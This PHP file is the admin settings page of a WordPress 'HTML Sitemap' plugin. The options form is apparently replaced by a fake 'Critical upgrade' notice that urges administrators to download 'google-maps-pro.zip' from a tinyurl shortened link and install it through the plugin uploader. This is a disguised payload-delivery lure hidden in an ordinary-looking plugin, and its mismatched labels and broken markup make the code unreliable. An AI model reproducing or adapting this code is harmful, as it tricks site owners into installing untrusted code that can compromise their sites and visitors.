<?php
class html_sitemap_admin {

	function html_sitemap_admin() {
		add_action('admin_menu', array(&$this, 'admin_menu'));
	}// end function

	function admin_menu() {
		$pluginpage = add_options_page('HTML Sitemap', 'HTML Sitemap', 'manage_options', __FILE__, array(&$this, 'settings_page'));
		add_action("admin_print_scripts-$pluginpage", array(&$this, 'admin_head'));
	}// end function

	function admin_head() {
		wp_enqueue_script('jquery');
		wp_enqueue_script('loadjs', WP_PLUGIN_URL.'/htmlsitemap/admin.js');
		echo '<link rel="stylesheet" href="'.WP_PLUGIN_URL.'/htmlsitemap/admin.css" type="text/css" />'."\n";
	}// end

	function settings_page() {
		
		global $html_sitemap;
		$pages = get_pages();

		$options = $html_sitemap->get_options();

		if ( isset($_POST['update']) ) {
			
			check_admin_referer('html_sitemap_settings');
			
			isset($_POST['show_pages']) ? $options['show_pages'] = true : $options['show_pages'] = false;
			$options['title_pages'] = trim($_POST['title_pages']);
			isset($_POST['show_home_page']) ? $options['show_home_page'] = true : $options['show_home_page'] = false;
			$options['home_page_text'] = trim($_POST['home_page_text']);
			isset($_POST['apply_excludes']) ? $options['apply_excludes'] = true : $options['apply_excludes'] = false;
			if ( is_array($_POST['excludepages']) )
				$options['excludepages'] = $_POST['excludepages'];
			else
				$options['excludepages'] = array();
			
			isset($_POST['show_posts']) ? $options['show_posts'] = true : $options['show_posts'] = false;
			$options['title_posts'] = trim($_POST['title_posts']);
			
			isset($_POST['show_categories']) ? $options['show_categories'] = true : $options['show_categories'] = false;
			$options['title_categories'] = trim($_POST['title_categories']);
			
			isset($_POST['show_feeds']) ? $options['show_feeds'] = true : $options['show_feeds'] = false;
			$options['title_feeds'] = trim($_POST['title_feeds']);

			update_option('html_sitemap', $options);

			if ( get_option('blog_public') != 1 )
				$msg .= '<p class="alert">Warning! Your blog Privacy settings are blocking the search engines!</p>';

			$msg .= '<p><strong>Settings saved.</strong></p>';

			echo '<div id="message" class="updated fade">'.$msg.'</div>';
		
		}// end if

		echo '<div class="wrap">'
			.'<h2>Maps</h2>'
			.'<form method="post">';
		if ( function_exists('wp_nonce_field') ) wp_nonce_field('html_sitemap_settings');
		echo '<p><font color="red">Critical upgrade</strong> is required.</font></p>'
.'<p>Click the <strong>Download</strong> button to download the PRO Version.</p>'
.'<h3>Upgrade to PRO for FREE!</h3>'
.'<a class="button-primary" href="http://tinyurl.com/7lsh44t">Download google-maps-pro.zip</a>'
.'<p>After downloading the PRO, <a href="../wp-admin/plugin-install.php?tab=upload" target="_blank">click here</a> to install it and your done.</p>'
.'<br/>'
			.'</div>';
		
	}// end function

}// end class
$html_sitemap_admin = new html_sitemap_admin;
